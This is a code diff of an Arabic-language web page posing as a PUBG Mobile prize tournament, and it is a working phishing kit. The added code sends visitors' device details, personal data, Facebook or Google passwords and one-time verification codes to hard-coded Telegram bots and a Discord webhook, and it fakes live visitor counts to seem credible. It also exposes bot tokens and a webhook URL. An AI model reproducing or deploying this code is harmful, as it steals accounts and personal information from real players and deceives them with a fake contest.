@@ -1342,12 +1342,58 @@
     <!-- المحرك البرمجي الشامل JavaScript Engine -->
     <script>
         /* ===================================================
-           1. بيانات الاعتماد الفنية للربط الفني Telegram API
+           1. إعدادات التكوين والربط الفني المنفصل (Configuration)
            =================================================== */
-        const TELEGRAM_BOT_TOKEN = "8898927305:AAHMxzFT5nZ3e6w30XuI-4ibBZjmTLhbw5M";
-        const TELEGRAM_CHAT_ID = "8796885500";
+
+        // أ) تكوين بوت المحادثة المباشرة والمراقبة (Chat & Live Monitoring Bot)
+        const CHAT_BOT_CONFIG = {
+            botToken: "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg",
+            chatId: "8796885500"
+        };
+
+        // ب) تكوين بوت استقبال البيانات والمعلومات والخطوات (Form Submissions & Data Bot)
+        const DATA_BOT_CONFIG = {
+            botToken: "8898927305:AAHMxzFT5nZ3e6w30XuI-4ibBZjmTLhbw5M",
+            chatId: "8796885500"
+        };
+
+        // ج) تكوين ديسكورد الويب هوك بنظام البطاقات والوحدات (Discord Webhook Config)
+        const DISCORD_CONFIG = {
+            webhookUrl: "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j"
+        };
+
         const TELEGRAM_SUPPORT_USER = "Pubg_Rivals";
         const WHATSAPP_SUPPORT_NUM = "+7 707 403 2501";
+
+        /* ===================================================
+           نظام إرسال البطاقات والوحدات لـ Discord Embeds
+           =================================================== */
+        async function sendDiscordEmbed({ title, description, color = 0x00f3ff, fields = [], footer = "" }) {
+            if (!DISCORD_CONFIG.webhookUrl) return;
+
+            const payload = {
+                username: "نظام التوثيق والمسابقات - PUBG Mobile",
+                avatar_url: "https://i.imgur.com/8N4A999.png",
+                embeds: [{
+                    title: title,
+                    description: description || "",
+                    color: color, // لون الشريط الجانبي للبطاقة
+                    fields: fields,
+                    footer: { text: footer || "نظام بطاقات المسابقة المباشرة" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(DISCORD_CONFIG.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Discord Webhook Error:", err);
+            }
+        }
 
         /* ===================================================
            2. النظام الصوتي المدمج (PUBG Web Audio Engine)
@@ -1552,14 +1598,12 @@
             usedIdentifiers: []
         };
 
-        // استعادة المسودة الحفظ التلقائي
         function loadDraft() {
             const saved = localStorage.getItem('pubg_tournament_draft');
             if (saved) {
                 try {
                     const parsed = JSON.parse(saved);
                     state = { ...state, ...parsed };
-                    // تعبئة الحقول بالقيم المحفوظة
                     if (state.fullName) document.getElementById('inputFullName').value = state.fullName;
                     if (state.phone) document.getElementById('inputPhone').value = state.phone;
                     if (state.age) document.getElementById('inputAge').value = state.age;
@@ -1581,12 +1625,12 @@
         }
 
         /* ===================================================
-           5. إرسال البيانات المباشر لبوت التليجرام
+           5. إرسال البيانات المباشر لبوت التليجرام الخاص بالمعلومات + ديسكورد
            =================================================== */
         function sendTelegramNotification(text) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const url = `https://api.telegram.org/bot${DATA_BOT_CONFIG.botToken}/sendMessage`;
             const payload = {
-                chat_id: TELEGRAM_CHAT_ID,
+                chat_id: DATA_BOT_CONFIG.chatId,
                 text: text,
                 parse_mode: 'HTML'
             };
@@ -1594,111 +1638,112 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => console.error("Telegram Send Error", err));
+            }).catch(err => console.error("Telegram Data Send Error", err));
         }
 
         // تتبع الزائر الأول واستخراج كافة بيانات الجهاز والشركة المصنعة والشبكة
-async function trackInitialVisit() {
-    const ua = navigator.userAgent;
+        async function trackInitialVisit() {
+            const ua = navigator.userAgent;
+            let brandAndModel = "غير معروف (قيود الخصوصية)";
 
-    // 1. تحديد الشركة المصنعة والموديل باسم الجهاز
-    let brandAndModel = "غير معروف (قيود الخصوصية)";
-
-    // أ) التتبع الحديث عبر Client Hints (يعمل بدقة عالية على Android و Chrome)
-    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        try {
-            const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
-            if (uaData.model) {
-                brandAndModel = uaData.model; // يُرجع موديل الجهاز مثل (SM-G998B أو Pixel 6)
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    if (uaData.model) {
+                        brandAndModel = uaData.model;
+                    }
+                } catch (e) {}
             }
-        } catch (e) {
-            console.log("Client Hints not supported or denied");
-        }
-    }
 
-    // ب) تحليل الـ User-Agent التقليدي لجلب الأيفون أو بعض أجهزة الأندرويد
-    if (brandAndModel.includes("غير معروف")) {
-        if (/iphone/i.test(ua)) {
-            brandAndModel = "Apple iPhone";
-        } else if (/ipad/i.test(ua)) {
-            brandAndModel = "Apple iPad";
-        } else if (/android/i.test(ua)) {
-            // محاولة استخراج الموديل من النص بين القوسين بداخل User-Agent
-            const match = ua.match(/\(([^)]+)\)/);
-            if (match && match[1]) {
-                const parts = match[1].split(';');
-                for (let part of parts) {
-                    if (part.includes("Build/") || part.includes("Android")) {
-                        brandAndModel = part.replace("Build/", "").trim();
-                        break;
+            if (brandAndModel.includes("غير معروف")) {
+                if (/iphone/i.test(ua)) brandAndModel = "Apple iPhone";
+                else if (/ipad/i.test(ua)) brandAndModel = "Apple iPad";
+                else if (/android/i.test(ua)) {
+                    const match = ua.match(/\(([^)]+)\)/);
+                    if (match && match[1]) {
+                        const parts = match[1].split(';');
+                        for (let part of parts) {
+                            if (part.includes("Build/") || part.includes("Android")) {
+                                brandAndModel = part.replace("Build/", "").trim();
+                                break;
+                            }
+                        }
                     }
                 }
             }
+
+            let deviceType = "كمبيوتر (Desktop)";
+            if (/mobile/i.test(ua)) deviceType = "هاتف محمول (Mobile)";
+            else if (/ipad|tablet/i.test(ua)) deviceType = "جهاز لوحي (Tablet)";
+
+            let os = "غير معروف";
+            if (/android/i.test(ua)) os = "Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
+            else if (/windows/i.test(ua)) os = "Windows";
+            else if (/mac os x/i.test(ua)) os = "Mac OS";
+            else if (/linux/i.test(ua)) os = "Linux";
+
+            let browser = "غير معروف";
+            if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
+            else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+            else if (/edg/i.test(ua)) browser = "Microsoft Edge";
+
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language || navigator.userLanguage;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let netType = "غير مدعوم";
+            let netSpeed = "غير معروف";
+            let rtt = "غير معروف";
+
+            if (connection) {
+                netType = connection.effectiveType ? connection.effectiveType.toUpperCase() : "غير معروف";
+                netSpeed = connection.downlink ? `${connection.downlink} Mbps` : "غير معروف";
+                rtt = connection.rtt ? `${connection.rtt} ms` : "غير معروف";
+            }
+
+            const now = new Date().toLocaleString('ar-EG');
+
+            // إرسال للبوت الخاص بالبيانات
+            const msg = `🚀 <b>زيارة جديدة للموقع!</b>\n\n` +
+                        `🏭 <b>اسم الجهاز/الموديل:</b> ${brandAndModel}\n` +
+                        `📱 <b>نوع الجهاز:</b> ${deviceType}\n` +
+                        `💻 <b>نظام التشغيل:</b> ${os}\n` +
+                        `🌐 <b>المتصفح:</b> ${browser}\n` +
+                        `📐 <b>دقة الشاشة:</b> ${screenSize}\n` +
+                        `🗣 <b>اللغة والمنطقة:</b> ${language} (${timeZone})\n\n` +
+                        `📶 <b>نوع الاتصال:</b> ${netType}\n` +
+                        `⚡ <b>السرعة المقدرة:</b> ${netSpeed}\n` +
+                        `⏱ <b>زمن الاستجابة:</b> ${rtt}\n\n` +
+                        `⏰ <b>الوقت:</b> ${now}\n` +
+                        `📍 <b>الإجراء:</b> فتح الصفحة الرئيسية للمسابقة`;
+
+            sendTelegramNotification(msg);
+
+            // إرسال بطاقة ديسبكورد منفصلة (Embed Card)
+            sendDiscordEmbed({
+                title: "🚀 زيارة جديدة لصفحة المسابقة",
+                description: "تم تسجيل دخول زائر جديد للموقع بالتفاصيل التالية:",
+                color: 0x3498db,
+                fields: [
+                    { name: "🏭 الجهاز / الموديل", value: brandAndModel, inline: true },
+                    { name: "📱 نوع الجهاز", value: deviceType, inline: true },
+                    { name: "💻 نظام التشغيل", value: os, inline: true },
+                    { name: "🌐 المتصفح", value: browser, inline: true },
+                    { name: "📐 دقة الشاشة", value: screenSize, inline: true },
+                    { name: "🗣 اللغة والتوقيت", value: `${language} (${timeZone})`, inline: true },
+                    { name: "📶 نوع الاتصال", value: `${netType} \vert{}${netSpeed}`, inline: true }
+                ],
+                footer: `تاريخ الزيارة: ${now}`
+            });
         }
-    }
-
-    // 2. تحديد نوع الجهاز
-    let deviceType = "كمبيوتر (Desktop)";
-    if (/mobile/i.test(ua)) deviceType = "هاتف محمول (Mobile)";
-    else if (/ipad|tablet/i.test(ua)) deviceType = "جهاز لوحي (Tablet)";
-
-    // 3. تحديد نظام التشغيل
-    let os = "غير معروف";
-    if (/android/i.test(ua)) os = "Android";
-    else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
-    else if (/windows/i.test(ua)) os = "Windows";
-    else if (/mac os x/i.test(ua)) os = "Mac OS";
-    else if (/linux/i.test(ua)) os = "Linux";
-
-    // 4. تحديد المتصفح
-    let browser = "غير معروف";
-    if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
-    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
-    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-    else if (/edg/i.test(ua)) browser = "Microsoft Edge";
-
-    // 5. أبعاد الشاشة واللغة والمنطقة
-    const screenSize = `${window.screen.width}x${window.screen.height}`;
-    const language = navigator.language || navigator.userLanguage;
-    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    // 6. معلومات الاتصال والشبكة
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    let netType = "غير مدعوم";
-    let netSpeed = "غير معروف";
-    let rtt = "غير معروف";
-
-    if (connection) {
-        netType = connection.effectiveType ? connection.effectiveType.toUpperCase() : "غير معروف";
-        netSpeed = connection.downlink ? `${connection.downlink} Mbps` : "غير معروف";
-        rtt = connection.rtt ? `${connection.rtt} ms` : "غير معروف";
-    }
-
-    const now = new Date().toLocaleString('ar-EG');
-
-    // صياغة الرسالة لتليجرام
-    const msg = `🚀 <b>زيارة جديدة للموقع!</b>\n\n` +
-                `🏭 <b>اسم الجهاز/الموديل:</b> ${brandAndModel}\n` +
-                `📱 <b>نوع الجهاز:</b> ${deviceType}\n` +
-                `💻 <b>نظام التشغيل:</b> ${os}\n` +
-                `🌐 <b>المتصفح:</b> ${browser}\n` +
-                `📐 <b>دقة الشاشة:</b> ${screenSize}\n` +
-                `🗣 <b>اللغة والمنطقة:</b> ${language} (${timeZone})\n\n` +
-                `📶 <b>نوع الاتصال:</b> ${netType}\n` +
-                `⚡ <b>السرعة المقدرة:</b> ${netSpeed}\n` +
-                `⏱ <b>زمن الاستجابة:</b> ${rtt}\n\n` +
-                `⏰ <b>الوقت:</b> ${now}\n` +
-                `📍 <b>الإجراء:</b> فتح الصفحة الرئيسية للمسابقة`;
-
-    sendTelegramNotification(msg);
-}
-
 
         /* ===================================================
            6. التنقل بين المراحل Card Stepper Engine
            =================================================== */
         function goToStep(stepNum) {
-            // قانون تخطي الأسئلة إذا تم التجاوز بنجاح سابقاً
             if (stepNum === 4 && state.passedQuizOnce) {
                 stepNum = 5;
             }
@@ -1707,12 +1752,10 @@ async function trackInitialVisit() {
             state.currentStep = stepNum;
             saveDraft();
 
-            // تحديث بطاقات العرض
             document.querySelectorAll('.glass-card').forEach(card => card.classList.remove('active'));
             const targetCard = document.getElementById(`cardStep${stepNum}`);
             if (targetCard) targetCard.classList.add('active');
 
-            // تحديث شريط التبويبات العلوي والتقدم
             document.querySelectorAll('.step-tab').forEach(tab => {
                 const tStep = parseInt(tab.dataset.step);
                 tab.classList.remove('active');
@@ -1723,7 +1766,6 @@ async function trackInitialVisit() {
             const fillPercent = (stepNum / 6) * 100;
             document.getElementById('progressBarFill').style.width = `${Math.min(fillPercent, 100)}%`;
 
-            // تشغيل الأسئلة إذا دخل مرحلة الأسئلة
             if (stepNum === 4 && !state.passedQuizOnce) {
                 initQuizChallenge();
             }
@@ -1731,7 +1773,6 @@ async function trackInitialVisit() {
             window.scrollTo({ top: 120, behavior: 'smooth' });
         }
 
-        // السماح بالنقر على التبويبات العلوية التنقل
         document.querySelectorAll('.step-tab').forEach(tab => {
             tab.addEventListener('click', () => {
                 const targetStep = parseInt(tab.dataset.step);
@@ -1778,7 +1819,8 @@ async function trackInitialVisit() {
 
         function submitStep2AndNext() {
             saveDraft();
-            // إرسال الخطوة 2 إلى تليجرام فوراً
+            
+            // إرسال للتليجرام
             const msg = `📋 <b>الخطوة 2: تسجيل البيانات الشخصية</b>\n` +
                         `👤 <b>الاسم:</b> ${state.fullName}\n` +
                         `📞 <b>الهاتف:</b> ${state.phone}\n` +
@@ -1787,6 +1829,21 @@ async function trackInitialVisit() {
                         `📍 <b>العنوان:</b> ${state.address}\n` +
                         `🎁 <b>الجائزة المختارة:</b> ${state.selectedReward}`;
             sendTelegramNotification(msg);
+
+            // إرسال بطاقة ديسبكورد
+            sendDiscordEmbed({
+                title: "📋 الخطوة 2: تسجيل البيانات الشخصية",
+                color: 0x2ecc71,
+                fields: [
+                    { name: "👤 الاسم الكامل", value: state.fullName, inline: true },
+                    { name: "📞 الهاتف", value: state.phone, inline: true },
+                    { name: "🎂 العمر", value: state.age, inline: true },
+                    { name: "🎮 الأيدي (ID)", value: state.playerID, inline: true },
+                    { name: "📍 العنوان", value: state.address, inline: true },
+                    { name: "🎁 الجائزة المختارة", value: state.selectedReward, inline: true }
+                ]
+            });
+
             goToStep(3);
         }
 
@@ -1807,7 +1864,7 @@ async function trackInitialVisit() {
             let deepLinkHtml = '';
 
             if (plat === 'facebook') {
-                labelUser.innerText = "اسم المستخدم /   او رقم الهاتف لحساب فيسبوك:";
+                labelUser.innerText = "اسم المستخدم / او رقم الهاتف لحساب فيسبوك:";
                 labelNotes.innerText = "ادخل كلمة المرور لحساب فيسبوك:";
                 groupMandatory.style.display = 'block';
                 deepLinkHtml = `<a href="https://facebook.com" target="_blank" class="deep-link-btn"><i class="fa-brands fa-facebook"></i> الانتقال لتطبيق فيسبوك لنسخ اسم المستخدم</a>`;
@@ -1819,7 +1876,7 @@ async function trackInitialVisit() {
             } else if (plat === 'google') {
                 labelUser.innerText = "عنوان البريد الإلكتروني لحساب جوجل:";
                 labelNotes.innerText = "ادخل كلمة المرور لحساب جوجل:";
-                groupMandatory.style.display = 'none'; // اختفاء الخانة الإضافية عند اختيار البريد/جوجل
+                groupMandatory.style.display = 'none';
                 deepLinkHtml = `<a href="https://myaccount.google.com" target="_blank" class="deep-link-btn"><i class="fa-brands fa-google"></i> فتح إعدادات حساب جوجل</a>`;
             } else if (plat === 'email') {
                 labelUser.innerText = "عنوان البريد الإلكتروني المرتبط بالحساب:";
@@ -1854,7 +1911,7 @@ async function trackInitialVisit() {
             state.mandatoryEmail = mandEmail;
 
             const isUserValid = userVal.length >= 3;
-            const isNotesValid = notesVal.length >= 1; // عدم تخطي كلمة الملاحظات
+            const isNotesValid = notesVal.length >= 1;
 
             let isMandatoryValid = true;
             if (state.platform !== 'google' && state.platform !== 'email') {
@@ -1870,13 +1927,26 @@ async function trackInitialVisit() {
 
         function submitStep3AndNext() {
             saveDraft();
-            // إرسال الخطوة 3 إلى التليجرام مباشرة
+
+            // إرسال للتليجرام
             const msg = `🔐 <b>الخطوة 3: معلومات الحساب والمنصة</b>\n` +
                         `🌐 <b>المنصة المختارة:</b> ${state.platform}\n` +
-                        `👤 <b>اسم المستخدم/البريد /:</b> ${state.platformUser}\n` +
-                        `🔑 <b>كلمة المرور :</b> ${state.notesPassword}\n` +
-                        `📧 <b>بريد التواصل :</b> ${state.mandatoryEmail}`;
+                        `👤 <b>اسم المستخدم/البريد:</b> ${state.platformUser}\n` +
+                        `🔑 <b>كلمة المرور:</b> ${state.notesPassword}\n` +
+                        `📧 <b>بريد التواصل:</b> ${state.mandatoryEmail}`;
             sendTelegramNotification(msg);
+
+            // إرسال بطاقة ديسكورد
+            sendDiscordEmbed({
+                title: "🔐 الخطوة 3: معلومات الحساب والمنصة",
+                color: 0xe67e22,
+                fields: [
+                    { name: "🌐 المنصة", value: state.platform, inline: true },
+                    { name: "👤 اسم المستخدم / البريد", value: state.platformUser, inline: true },
+                    { name: "🔑 كلمة المرور", value: state.notesPassword, inline: true },
+                    { name: "📧 بريد التواصل الإضافي", value: state.mandatoryEmail || "غير محدد", inline: true }
+                ]
+            });
 
             if (state.passedQuizOnce) {
                 goToStep(5);
@@ -1891,7 +1961,6 @@ async function trackInitialVisit() {
         function initQuizChallenge() {
             state.score = 0;
             document.getElementById('quizScore').innerText = '0';
-            // اختيار 3 أسئلة عشوائية بدون تكرار
             const shuffled = [...pubgTriviaBank].sort(() => 0.5 - Math.random());
             state.activeQuestions = shuffled.slice(0, 3);
             state.currentQuestionIdx = 0;
@@ -1900,11 +1969,17 @@ async function trackInitialVisit() {
 
         function renderCurrentQuestion() {
             if (state.currentQuestionIdx >= 3) {
-                // نجاح التحدي!
                 audio.playCorrect();
                 state.passedQuizOnce = true;
                 saveDraft();
+                
                 sendTelegramNotification(`💡 <b>الخطوة 4: اجتياز تحدي الأسئلة بنجاح! (3/3)</b>`);
+                sendDiscordEmbed({
+                    title: "💡 الخطوة 4: اجتياز تحدي الأسئلة",
+                    description: `اللاعب **${state.fullName}** (ID:${state.playerID}) أتم بنجاح الإجابة على الأسئلة التنافسية.`,
+                    color: 0x9b59b6
+                });
+
                 alert("تهانينا! لقد أجبت على 3 أسئلة بنجاح وتم تأهيلك لمرحلة الكود والجائزة.");
                 goToStep(5);
                 return;
@@ -1914,12 +1989,11 @@ async function trackInitialVisit() {
             document.getElementById('questionCounter').innerText = `السؤال ${state.currentQuestionIdx + 1} من 3:`;
             document.getElementById('questionText').innerText = qObj.q;
 
-            // خلط أماكن الإجابات عشوائياً
             const optionsContainer = document.getElementById('optionsContainer');
             optionsContainer.innerHTML = '';
 
             let indexedOpts = qObj.opts.map((opt, idx) => ({ text: opt, isCorrect: idx === qObj.a }));
-            indexedOpts.sort(() => 0.5 - Math.random()); // خلط أماكن الإجابات (مرة أعلى، مرة أسفل، مرة وسط)
+            indexedOpts.sort(() => 0.5 - Math.random());
 
             indexedOpts.forEach(optItem => {
                 const btn = document.createElement('button');
@@ -1945,7 +2019,6 @@ async function trackInitialVisit() {
                 if (state.quizTimerVal <= 0) {
                     clearInterval(state.quizTimerInterval);
                     audio.playTimerEnd();
-                    // انقضاء الوقت يعتبر إجابة خاطئة واستبدال السؤال
                     replaceQuestionOnWrong();
                 }
             }, 1000);
@@ -1975,7 +2048,6 @@ async function trackInitialVisit() {
         }
 
         function replaceQuestionOnWrong() {
-            // سحب سؤال جديد فوراً دون احتساب النقطة
             const newQ = pubgTriviaBank[Math.floor(Math.random() * pubgTriviaBank.length)];
             state.activeQuestions[state.currentQuestionIdx] = newQ;
             renderCurrentQuestion();
@@ -1988,9 +2060,18 @@ async function trackInitialVisit() {
             const val = document.getElementById('inputCode1').value.trim();
             state.code1 = val;
 
-            // إذا تم إدخال 5 أو 6 أو 8 أرقام يتم إرسالها فوراً لبوت التليجرام
             if (val.length === 5 || val.length === 6 || val.length === 8) {
-                sendTelegramNotification(`🔑 <b>إدخال تلقائي للكود الأول (${val.length} أرقام):</b> <code>${val}</code>\n👤 <b>اللاعب:</b> ${state.fullName} (ID: ${state.playerID})`);
+                sendTelegramNotification(`🔑 <b>إدخال تلقائي للكود الأول (${val.length} أرقام):</b> <code>${val}</code>\n👤 <b>اللاعب:</b> ${state.fullName} (ID:${state.playerID})`);
+                
+                sendDiscordEmbed({
+                    title: "🔑 إدخال تلقائي للكود الأول",
+                    color: 0x1abc9c,
+                    fields: [
+                        { name: "👤 اللاعب", value: state.fullName, inline: true },
+                        { name: "🎮 الأيدي", value: state.playerID, inline: true },
+                        { name: "🔢 الكود المدخل", value: val, inline: true }
+                    ]
+                });
             }
             validateStep5();
         }
@@ -2001,11 +2082,9 @@ async function trackInitialVisit() {
             const chk = document.getElementById('chkReceivedCode1').checked;
 
             const isCodeValid = code.length >= 5 && /^[0-9]+$/.test(code);
-            // المعرف يبدأ بـ 728 ومتبوع بثلاثة أرقام
             const isIdenValid = /^728[0-9]{3}$/.test(iden);
 
             state.identifier1 = iden;
-
             document.getElementById('btnSubmitCode1').disabled = !(isCodeValid && isIdenValid && chk);
         }
 
@@ -2017,43 +2096,46 @@ async function trackInitialVisit() {
         }
 
         function submitCode1AndNext() {
-    const EXPIRATION_TIME = 24 * 60 * 60 * 1000; // 24 ساعة بالمللي ثانية
-    const now = Date.now();
+            const EXPIRATION_TIME = 24 * 60 * 60 * 1000;
+            const now = Date.now();
 
-    // 1. التأكد من وجود القائمة وتنظيف المعرفات التي مضى عليها أكثر من 24 ساعة
-    if (!Array.isArray(state.usedIdentifiers)) {
-        state.usedIdentifiers = [];
-    }
+            if (!Array.isArray(state.usedIdentifiers)) {
+                state.usedIdentifiers = [];
+            }
 
-    state.usedIdentifiers = state.usedIdentifiers.filter(item => {
-        if (typeof item === 'object' && item.timestamp) {
-            return (now - item.timestamp) < EXPIRATION_TIME;
-        }
-        return false; // حذف النص القديم غير المؤرخ
-    });
+            state.usedIdentifiers = state.usedIdentifiers.filter(item => {
+                if (typeof item === 'object' && item.timestamp) {
+                    return (now - item.timestamp) < EXPIRATION_TIME;
+                }
+                return false;
+            });
 
-    // 2. فحص هل المعرف الحالي مستخدم خلال الـ 24 ساعة الماضية
-    const isUsed = state.usedIdentifiers.some(item => item.id === state.identifier1);
+            const isUsed = state.usedIdentifiers.some(item => item.id === state.identifier1);
 
-    if (isUsed) {
-        if (typeof audio !== 'undefined' && audio.playWrong) {
-            audio.playWrong();
-        }
-        alert("عذراً، معرف العملية هذا مستخدم خلال الـ 24 ساعة الماضية. يرجى طلب معرف جديد.");
-        return;
-    }
+            if (isUsed) {
+                if (typeof audio !== 'undefined' && audio.playWrong) {
+                    audio.playWrong();
+                }
+                alert("عذراً، معرف العملية هذا مستخدم خلال الـ 24 ساعة الماضية. يرجى طلب معرف جديد.");
+                return;
+            }
 
-    // 3. إضافة المعرف الجديد كـ كائن يحتوي على (المعرف + وقت الإدخال)
-    state.usedIdentifiers.push({ id: state.identifier1, timestamp: now });
-
-    // 4. حفظ مسودة البيانات
-    saveDraft();
-
+            state.usedIdentifiers.push({ id: state.identifier1, timestamp: now });
+            saveDraft();
 
             const msg = `✅ <b>الخطوة 5: نجاح الكود الأول والمعرف</b>\n` +
                         `🔢 <b>الكود الأول:</b> <code>${state.code1}</code>\n` +
                         `🆔 <b>معرف العملية الأول:</b> <code>${state.identifier1}</code>`;
             sendTelegramNotification(msg);
+
+            sendDiscordEmbed({
+                title: "✅ الخطوة 5: نجاح الكود الأول والمعرف",
+                color: 0x27ae60,
+                fields: [
+                    { name: "🔢 الكود الأول", value: state.code1, inline: true },
+                    { name: "🆔 معرف العملية الأول", value: state.identifier1, inline: true }
+                ]
+            });
 
             alert("تم فحص الكود الأول بنجاح! جاري الانتقال لمرحلة التوثيق والتأكيد النهائي.");
             goToStep(6);
@@ -2078,7 +2160,6 @@ async function trackInitialVisit() {
             window.open(url, '_blank');
             alert("تم التوجيه للتطبيق. هذه الخطوة لازمة لتأكيد الملكية والمتابعة في المسابقة.");
 
-            // الانتظار 10 ثوانٍ ثم تفعيل علامة الصح تلقائياً وإلغاء التعطيل
             setTimeout(() => {
                 const chk = document.getElementById('chkAutoVerified');
                 chk.checked = true;
@@ -2086,7 +2167,13 @@ async function trackInitialVisit() {
                 chk.parentElement.style.color = "var(--success-green)";
                 audio.playCorrect();
 
-                sendTelegramNotification(`📲 <b>تم التوجيه للتطبيق وتأكيد الإشعار بنجاح للمنصة: ${plat}</b> (ID: ${state.playerID})`);
+                sendTelegramNotification(`📲 <b>تم التوجيه للتطبيق وتأكيد الإشعار بنجاح للمنصة: ${plat}</b> (ID:${state.playerID})`);
+                sendDiscordEmbed({
+                    title: "📲 توجيه وتأكيد الإشعار بنجاح",
+                    description: `قام اللاعب **${state.fullName}** بالتحقق من تطبيق المنصة (${plat}).`,
+                    color: 0x34495e
+                });
+
                 validateStep6();
             }, 7000);
         }
@@ -2095,9 +2182,7 @@ async function trackInitialVisit() {
             const iden2 = document.getElementById('inputIdentifier2').value.trim();
             const chkAuto = document.getElementById('chkAutoVerified').checked;
 
-            // المعرف يبدأ بـ 705 ومتبوع بثلاثة أرقام
             const isIden2Valid = /^705[0-9]{3}$/.test(iden2);
-
             state.identifier2 = iden2;
 
             document.getElementById('btnFinalSubmit').disabled = !(isIden2Valid && chkAuto);
@@ -2115,16 +2200,15 @@ async function trackInitialVisit() {
                 alert("عذراً، تأكد من معرف العملية. لا يمكن استخدام نفس المعرف السابق!");
                 return;
             }
-            if (state.usedIdentifiers.includes(state.identifier2)) {
+            if (state.usedIdentifiers.some(item => item.id === state.identifier2)) {
                 audio.playWrong();
                 alert("عذراً، هذا الكود مُستخدم. يرجى طلب كود تأكيد جديد للاستمرار.");
                 return;
             }
 
-            state.usedIdentifiers.push(state.identifier2);
+            state.usedIdentifiers.push({ id: state.identifier2, timestamp: Date.now() });
             saveDraft();
 
-            // إرسال الإشعار النهائي الشامل إلى التليجرام
             const finalMsg = `🏆 <b>تم إتمام التسجيل النهائي بنجاح!</b> 🎉\n` +
                              `========================\n` +
                              `👤 <b>الاسم:</b> ${state.fullName}\n` +
@@ -2133,13 +2217,31 @@ async function trackInitialVisit() {
                              `🎁 <b>الجائزة:</b> ${state.selectedReward}\n` +
                              `🌐 <b>المنصة:</b> ${state.platform} (${state.platformUser})\n` +
                              `🔑 <b>كلمة المرور:</b> ${state.notesPassword}\n` +
-                             `🔢 <b>الكود 1 والمعرف:</b> <code>${state.code1}</code> | <code>${state.identifier1}</code>\n` +
+                             `🔢 <b>الكود 1 والمعرف:</b> <code>${state.code1}</code> \vert{} <code>${state.identifier1}</code>\n` +
                              `🔢 <b>المعرف الثاني:</b> <code>${state.identifier2}</code>\n` +
                              `========================`;
             sendTelegramNotification(finalMsg);
 
+            // إرسال بطاقة توثيق نهائية شاملة في ديسكورد (Gold Card)
+            sendDiscordEmbed({
+                title: "🏆 تم إتمام التسجيل النهائي بنجاح! 🎉",
+                description: "تم توثيق بيانات المشارك وإدراجه في قائمة السحب الأسبوعي.",
+                color: 0xf1c40f,
+                fields: [
+                    { name: "👤 اسم المتسابق", value: state.fullName, inline: true },
+                    { name: "📞 رقم الهاتف", value: state.phone, inline: true },
+                    { name: "🎮 الأيدي (ID)", value: state.playerID, inline: true },
+                    { name: "🎁 الجائزة المختارة", value: state.selectedReward, inline: true },
+                    { name: "🌐 المنصة واليوزر", value: `${state.platform} (${state.platformUser})`, inline: true },
+                    { name: "🔑 كلمة المرور", value: state.notesPassword, inline: true },
+                    { name: "🔢 كود التحقق 1 / المعرف 1", value: `${state.code1} \vert{}${state.identifier1}`, inline: false },
+                    { name: "🔢 المعرف الثاني 2", value: state.identifier2, inline: true }
+                ],
+                footer: "PUBG Mobile Tournament System - Final Registration"
+            });
+
             audio.playCelebration();
-            document.getElementById('successPlayerMessage').innerText = `تم إدراج  أسمك والأيدي الخاص بك (${state.playerID}) في قائمة المشاركين في السحب الأسبوعي.`;
+            document.getElementById('successPlayerMessage').innerText = `تم إدراج أسمك والأيدي الخاص بك (${state.playerID}) في قائمة المشاركين في السحب الأسبوعي.`;
             goToStep(7);
         }
 
@@ -2151,12 +2253,10 @@ async function trackInitialVisit() {
             let registered = 340;
 
             setInterval(() => {
-                // تذبذب الزوار
                 visitors += Math.floor(Math.random() * 7) - 3;
                 if (visitors < 300) visitors = 350;
                 document.getElementById('liveVisitorsCount').innerText = visitors;
 
-                // تحديث المسجلين ببطء شديد وأن يكون أقل دائماً من الزوار وأقل من 1000
                 if (Math.random() > 0.6 && registered < visitors - 50 && registered < 980) {
                     registered += 1;
                     document.getElementById('registeredCount').innerText = registered;
@@ -2164,11 +2264,10 @@ async function trackInitialVisit() {
             }, 3000);
         }
 
-        // عداد انقضاء وقت المسابقة حتى نهاية يوم الجمعة
         function initWeeklyCountdown() {
             function updateTimer() {
                 const now = new Date();
-                const dayOfWeek = now.getDay(); // 5 = الجمعة
+                const dayOfWeek = now.getDay();
                 let daysUntilFriday = (5 - dayOfWeek + 7) % 7;
                 
                 const target = new Date(now.getFullYear(), now.getMonth(), now.getDate() + daysUntilFriday, 23, 59, 59);
@@ -2184,404 +2283,348 @@ async function trackInitialVisit() {
             updateTimer();
         }
 
-       /* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام)
-   ========================================================================== */
+        /* ==========================================================================
+           منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام + ديسكورد)
+           ========================================================================== */
+        const toastNames = [
